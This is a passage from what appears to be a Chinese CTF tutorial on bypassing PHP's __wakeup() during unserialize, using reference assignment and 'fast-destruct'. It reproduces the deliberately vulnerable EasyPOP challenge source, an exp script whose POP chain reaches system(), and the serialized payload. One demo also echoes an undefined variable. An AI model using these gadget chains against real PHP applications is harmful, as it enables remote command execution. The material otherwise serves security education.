</span></span><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">test</span> (<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">$a</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$x</span><span style="color:#ff636f">=&amp;</span><span style="color:#58a1dd">$a</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$x</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;123&#39;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;11&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">test</span>(<span style="color:#58a1dd">$a</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">$a</span>;</span></span></code></pre></div><p>输出:</p>
<pre tabindex="0"><code>123</code></pre><p>可以看到这里我们虽然最初$a=’11’，但由于我们通过$x=&amp;$a使两个变量同时指向同一个内存地址了，所以使$x=’123’也导致$a=’123’了。</p>
<p>举个例子：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">KeyPort</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">$key</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__destruct</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">key</span><span style="color:#ff636f">=</span><span style="color:#ff636f">False</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span>(<span style="color:#ff636f">!</span><span style="color:#58a1dd">isset</span>(<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">wakeup</span>)<span style="color:#ff636f">||!</span><span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">wakeup</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">echo</span> <span style="color:#a6be9d">&#34;You get it!&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__wakeup</span>(){
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">wakeup</span><span style="color:#ff636f">=</span><span style="color:#ff636f">True</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span>(<span style="color:#58a1dd">isset</span>(<span style="color:#58a1dd">$_POST</span>[<span style="color:#a6be9d">&#39;pop&#39;</span>])){
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">@</span><span style="color:#58a1dd">unserialize</span>(<span style="color:#58a1dd">$_POST</span>[<span style="color:#a6be9d">&#39;pop&#39;</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>可以看到如果我们想触发echo必须首先满足:</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">if</span>(<span style="color:#ff636f">!</span><span style="color:#58a1dd">isset</span>(<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">wakeup</span>)<span style="color:#ff636f">||!</span><span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">wakeup</span>)</span></span></code></pre></div><p>也就是说要么不给wakeup赋值，让它接受不到$this-&gt;wakeup，要么控制wakeup为false，但我们注意到KeyPort::__wakeup()，这里使$this-&gt;wakeup=True;，我们知道在用unserialize()反序列化字符串时，会先触发__wakeup()，然后再进行反序列化，所以相当于我们刚进行反序列化$this-&gt;wakeup就等于True了，这就没办法达到我们控制wake为false的想法了</p>
<p>因此这里的难点其实就是这个wakeup()绕过，我们可以使用上面提到过的引用赋值的方法以此将wakeup和key的值进行引用，让key的值改变的时候也改变wakeup的值即可</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">KeyPort</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">$key</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__destruct</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">KeyPort</span>();
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">key</span><span style="color:#ff636f">=&amp;</span><span style="color:#58a1dd">$a</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">wakeup</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">serialize</span>(<span style="color:#58a1dd">$keyport</span>); 
</span></span></code></pre></div><p><img loading="lazy" src="https://fushuling.com/wp-content/uploads/2023/03/1-23.jpg" alt="img" srcset="https://fushuling.com/wp-content/uploads/2023/03/1-23.jpg?size=small, https://fushuling.com/wp-content/uploads/2023/03/1-23.jpg?size=medium 1.5x, https://fushuling.com/wp-content/uploads/2023/03/1-23.jpg?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>2022年中国工业互联网安全大赛预选赛里有道wakeup题就是运用了这个知识点，具体可以看<a href="https://forum.butian.net/share/1936"target="_blank" rel="external nofollow noopener noreferrer">2022年中国工业互联网安全大赛北京市选拔赛暨全国线上预选赛-Writeup</a>，这道题用了很巧妙的方法绕过了死亡wakeup最后构造了命令。</p>
<h2 id="fast-destruct" class="heading-element"><span>fast-destruct</span>
  <a href="#fast-destruct" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>1、如果单独执行<code>unserialize</code>函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。</p>
<p>2、如果反序列化函数序列化出来的对象被赋给了程序中的变量，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，当这个对象被销毁，才会执行其析构函数。</p>
<ul>
<li>一种方式就是修改序列化字符串的结构，使得完成部分反序列化的unserialize强制退出，提前触发<code>__destruct</code></li>
</ul>
<pre tabindex="0"><code>$a = new a();
$arry = array($a,&#34;1234&#34;);
$result = serialize($arry);echo $result.&#34;&lt;br&gt;&#34;;
//a:2:{i:0;O:1:&#34;a&#34;:1:{s:1:&#34;a&#34;;s:3:&#34;123&#34;;}i:1;s:4:&#34;1234&#34;;}   这是正常的
//a:2:{i:0;O:1:&#34;a&#34;:1:{s:1:&#34;a&#34;;s:3:&#34;123&#34;;}i:0;s:4:&#34;1234&#34;;}   #修改序列化数字元素个数
//a:2:{i:0;O:1:&#34;a&#34;:1:{s:1:&#34;a&#34;;s:3:&#34;123&#34;;}i:1;s:4:&#34;1234&#34;;    #去掉序列化尾部 }</code></pre><p>本质上，fast destruct 是因为unserialize过程中扫描器发现序列化字符串格式有误导致的提前异常退出，为了销毁之前建立的对象内存空间，会立刻调用对象的<code>__destruct()</code>,提前触发反序列化链条。</p>
<p>我们可以看到DASCTF X GFCTF 2022十月挑战赛里EasyPOP这道题，源码是：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">highlight_file</span>(<span style="color:#58a1dd">__FILE__</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">error_reporting</span>(<span style="color:#a6be9d">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">fine</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#58a1dd">$cmd</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#58a1dd">$content</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__construct</span>(<span style="color:#58a1dd">$cmd</span>, <span style="color:#58a1dd">$content</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">cmd</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$cmd</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">content</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$content</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__invoke</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">call_user_func</span>(<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">cmd</span>, <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">content</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__wakeup</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">cmd</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">die</span>(<span style="color:#a6be9d">&#34;Go listen to Jay Chou&#39;s secret-code! Really nice&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">show</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">$ctf</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">$time</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;Two and a half years&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__construct</span>(<span style="color:#58a1dd">$ctf</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">ctf</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$ctf</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__toString</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">ctf</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">show</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">show</span>()<span style="color:#ff636f">:</span> <span style="color:#58a1dd">string</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">ctf</span> <span style="color:#ff636f">.</span> <span style="color:#a6be9d">&#34;: Duration of practice: &#34;</span> <span style="color:#ff636f">.</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">time</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">sorry</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#58a1dd">$name</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#58a1dd">$password</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">$hint</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;hint is depend on you&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">$key</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__construct</span>(<span style="color:#58a1dd">$name</span>, <span style="color:#58a1dd">$password</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">name</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$name</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">password</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$password</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__sleep</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">hint</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">secret_code</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__get</span>(<span style="color:#58a1dd">$name</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$name</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">key</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$name</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__destruct</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">password</span> <span style="color:#ff636f">==</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">name</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">echo</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">hint</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#ff636f">else</span> <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">name</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;jay&#34;</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">secret_code</span><span style="color:#ff636f">::</span><span style="color:#58a1dd">secret</span>();
</span></span><span style="display:flex;"><span>        } <span style="color:#ff636f">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">echo</span> <span style="color:#a6be9d">&#34;This is our code&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">getPassword</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">password</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">setPassword</span>(<span style="color:#58a1dd">$password</span>)<span style="color:#ff636f">:</span> <span style="color:#58a1dd">void</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">password</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$password</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">secret_code</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">protected</span> <span style="color:#58a1dd">$code</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">secret</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">include_once</span> <span style="color:#a6be9d">&#34;hint.php&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">hint</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__call</span>(<span style="color:#58a1dd">$name</span>, <span style="color:#58a1dd">$arguments</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$num</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$name</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">$num</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">show</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">code</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">secret</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> (<span style="color:#58a1dd">isset</span>(<span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;pop&#39;</span>])) {
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$a</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">unserialize</span>(<span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;pop&#39;</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$a</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">setPassword</span>(<span style="color:#58a1dd">md5</span>(<span style="color:#58a1dd">mt_rand</span>()));
</span></span><span style="display:flex;"><span>} <span style="color:#ff636f">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$a</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">show</span>(<span style="color:#a6be9d">&#34;Ctfer&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">echo</span> <span style="color:#58a1dd">$a</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">show</span>();
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>可以看到这里有个难点就是wakeup的绕过：</p>
<pre tabindex="0"><code>    public function __wakeup()
    {
        $this-&gt;cmd = &#34;&#34;;
        die(&#34;Go listen to Jay Chou&#39;s secret-code! Really nice&#34;);
    }</code></pre><p>exp:</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">sorry</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>   <span style="color:#ff636f">public</span> <span style="color:#58a1dd">$name</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">$password</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">$key</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">$hint</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">show</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">$ctf</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">secret_code</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">$code</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">fine</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">$cmd</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">$content</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__construct</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">cmd</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;system&#39;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">content</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39; /&#39;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span><span style="color:#ff636f">=</span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">sorry</span>();
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$b</span><span style="color:#ff636f">=</span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">show</span>();
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$c</span><span style="color:#ff636f">=</span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">secret_code</span>();
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$d</span><span style="color:#ff636f">=</span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">fine</span>();
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">hint</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$b</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$b</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">ctf</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$c</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$e</span><span style="color:#ff636f">=</span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">sorry</span>();
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$e</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">hint</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$d</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$c</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">code</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$e</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$e</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">key</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$d</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> (<span style="color:#58a1dd">serialize</span>(<span style="color:#58a1dd">$a</span>));
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#O:5:&#34;sorry&#34;:4:{s:4:&#34;name&#34;;N;s:8:&#34;password&#34;;N;s:3:&#34;key&#34;;N;s:4:&#34;hint&#34;;O:4:&#34;show&#34;:1:{s:3:&#34;ctf&#34;;O:11:&#34;secret_code&#34;:1:{s:4:&#34;code&#34;;O:5:&#34;sorry&#34;:4:{s:4:&#34;name&#34;;N;s:8:&#34;password&#34;;N;s:3:&#34;key&#34;;O:4:&#34;fine&#34;:2:{s:3:&#34;cmd&#34;;s:6:&#34;system&#34;;s:7:&#34;content&#34;;s:2:&#34; /&#34;;}s:4:&#34;hint&#34;;r:10;}}}}
</span></span></span></code></pre></div><p>直接传进去毫无疑问会因为die()而终止，这里我们就可以用fast-destruct这个技巧使destruct提前发生以绕过wakeup()，比如我们可以减少一个} ：</p>
